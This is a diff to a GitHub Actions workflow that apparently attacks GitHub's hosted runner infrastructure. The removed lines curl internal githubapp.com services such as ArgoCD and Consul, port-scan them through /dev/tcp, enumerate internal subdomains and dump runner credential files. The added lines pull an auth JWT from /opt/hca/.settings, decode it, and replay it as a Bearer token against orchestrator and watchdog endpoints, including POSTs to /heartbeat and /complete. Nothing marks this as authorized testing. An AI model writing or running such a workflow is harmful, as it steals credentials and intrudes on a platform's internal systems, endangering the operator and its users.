@@ -1,63 +1,84 @@
-name: Internal Services Scan
+name: JWT Extract
 on:
   workflow_dispatch:
 jobs:
-  scan:
+  jwt:
     runs-on: ubuntu-latest
     steps:
-      - name: Probe internal services
+      - name: Extract full JWT and use it
         timeout-minutes: 8
         run: |
           set +e
-          echo "=== PYROSCOPE ==="
-          for path in / /healthz /ready /api/v1/apps /api/v1/labels /api/v1/label-values /render /config; do
-            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://pyroscope.githubapp.com$path" 2>&1)
-            [ "$CODE" != "000" ] && echo "pyroscope$path [$CODE]: $(head -c 300 /tmp/resp)"
-          done
+          echo "=== EXTRACT FULL JWT FROM HCA SETTINGS ==="
+          FULL_SETTINGS=$(xxd -p /opt/hca/.settings 2>/dev/null | tr -d '\n')
+          echo "Settings hex length: ${#FULL_SETTINGS}"
+          python3 -c "
+import sys, json, base64, urllib.request
+import binascii
+hex_data = open('/opt/hca/.settings', 'rb').read()
+settings = json.loads(hex_data)
+token = settings.get('authToken', '')
+print('TOKEN_LEN:', len(token))
+# Split JWT parts
+parts = token.split('.')
+print('JWT_PARTS:', len(parts))
+if len(parts) >= 2:
+    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
+    print('HEADER:', json.dumps(header))
+    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+    print('PAYLOAD:', json.dumps(payload, indent=2))
+# Now use token to access orchestrator
+sched_url = settings.get('schedulerApiUrl', '')
+print('SCHED_URL:', sched_url)
+for path in ['', '/', '/status', '/health', '/vms', '/allocations', '/config', '/register', '/heartbeat']:
+    url = sched_url + path
+    try:
+        req = urllib.request.Request(url)
+        req.add_header('Authorization', 'Bearer ' + token)
+        req.add_header('Content-Type', 'application/json')
+        resp = urllib.request.urlopen(req, timeout=5)
+        body = resp.read().decode()[:500]
+        print(f'ORCH {path}: [{resp.status}] {body}')
+    except urllib.error.HTTPError as e:
+        body = e.read().decode()[:300]
+        print(f'ORCH {path}: [{e.code}] {body}')
+    except Exception as ex:
+        print(f'ORCH {path}: ERR {ex}')
+# Also try POST endpoints
+for path in ['/heartbeat', '/complete', '/trace']:
+    url = sched_url + path
+    try:
+        req = urllib.request.Request(url, method='POST', data=b'{}')
+        req.add_header('Authorization', 'Bearer ' + token)
+        req.add_header('Content-Type', 'application/json')
+        resp = urllib.request.urlopen(req, timeout=5)
+        body = resp.read().decode()[:500]
+        print(f'ORCH POST {path}: [{resp.status}] {body}')
+    except urllib.error.HTTPError as e:
+        body = e.read().decode()[:300]
+        print(f'ORCH POST {path}: [{e.code}] {body}')
+    except Exception as ex:
+        print(f'ORCH POST {path}: ERR {ex}')
+# Try watchdog
+wd_url = settings.get('watchdogTraceApiUrl', '').replace('/trace', '')
+print('WATCHDOG_URL:', wd_url)
+for path in ['', '/health', '/status', '/config']:
+    url = wd_url + path
+    try:
+        req = urllib.request.Request(url)
+        req.add_header('Authorization', 'Bearer ' + token)
+        resp = urllib.request.urlopen(req, timeout=5)
+        print(f'WD {path}: [{resp.status}] {resp.read().decode()[:300]}')
+    except urllib.error.HTTPError as e:
+        print(f'WD {path}: [{e.code}] {e.read().decode()[:200]}')
+    except Exception as ex:
+        print(f'WD {path}: ERR {ex}')
+# Print full settings (without token)
+safe = {k: v if k != 'authToken' else v[:20]+'...' for k, v in settings.items()}
+print('ALL_SETTINGS:', json.dumps(safe, indent=2))
+          "
           echo ""
-          echo "=== ARGOCD ==="
-          for path in / /healthz /api/v1/applications /api/v1/clusters /api/v1/repositories /api/v1/session /api/v1/settings /api/version; do
-            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://argocd.githubapp.com$path" 2>&1)
-            [ "$CODE" != "000" ] && echo "argocd$path [$CODE]: $(head -c 300 /tmp/resp)"
-          done
-          echo ""
-          echo "=== CONSUL ==="
-          for path in / /v1/agent/self /v1/catalog/services /v1/catalog/nodes /v1/kv/ /v1/status/leader /ui/; do
-            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://consul.githubapp.com$path" 2>&1)
-            [ "$CODE" != "000" ] && echo "consul$path [$CODE]: $(head -c 300 /tmp/resp)"
-          done
-          echo ""
-          echo "=== ALL DISCOVERED SERVICES DEEP ==="
-          for host in consul.githubapp.com pyroscope.githubapp.com argocd.githubapp.com; do
-            echo "--- $host ports ---"
-            for port in 80 443 8080 8443 8500 8300 8301 8302 9090 3000 4040 4100 6443 8081 8082 9411; do
-              timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo "$host:$port OPEN"
-            done
-          done
-          echo ""
-          echo "=== CONFIGMAP ==="
-          ls -laR /mnt/configmap/ 2>/dev/null || echo no configmap
-          find /mnt/ -type f 2>/dev/null | head -20
-          echo ""
-          echo "=== HCA .settings FULL RAW ==="
-          xxd /opt/hca/.settings 2>/dev/null | head -40
-          echo ""
-          echo "=== HCA DIAGNOSTICS.JSON ==="
-          xxd /opt/hca/diagnostics.json 2>/dev/null | head -20
-          echo ""
-          echo "=== RUNNER .credentials RAW ==="
-          find /home/runner -name .credentials 2>/dev/null | while read f; do echo $f; xxd $f 2>/dev/null | head -20; done
-          echo ""
-          echo "=== MORE GITHUBAPP SUBDOMAINS ==="
-          for sub in actions-broker actions-token actions-cache-prod actions-results-prod runner-provisioner-prod codespace-provisioner-prod hosted-compute-watchdog-prod hosted-compute-primer-prod observability telemetry analytics metrics sentry datadog newrelic splunk pagerduty opsgenie statuspage; do
-            IP=$(dig +short "$sub.githubapp.com" 2>/dev/null | tail -1)
-            [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"
-          done
-          echo ""
-          echo "=== GITHUB.NET SUBDOMAINS ==="
-          for sub in admin api internal vpn ssh git lb proxy cache cdn compute runner actions copilot spark; do
-            IP=$(dig +short "$sub.github.net" 2>/dev/null | tail -1)
-            [ -n "$IP" ] && echo "$sub.github.net -> $IP"
-          done
+          echo "=== ALSO RUNNER TOKEN ==="
+          xxd -p /home/runner/actions-runner/cached/*/. credentials 2>/dev/null | tr -d '\n' | head -c 2000
           echo ""
           echo "=== DONE ==="
